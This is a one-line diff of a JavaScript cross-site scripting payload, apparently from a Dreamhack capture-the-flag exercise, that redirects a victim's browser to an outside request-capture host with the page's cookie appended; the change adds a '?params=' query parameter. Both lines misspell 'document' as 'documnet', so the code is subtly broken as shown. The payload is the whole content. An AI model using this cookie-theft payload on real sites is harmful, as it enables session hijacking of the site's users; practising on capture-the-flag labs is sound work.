@@ -1,1 +1,1 @@
-location.href='https://igxihss.request.dreamhack.games'%2bdocumnet.cookie
+location.href='https://igxihss.request.dreamhack.games?params='%2bdocumnet.cookie
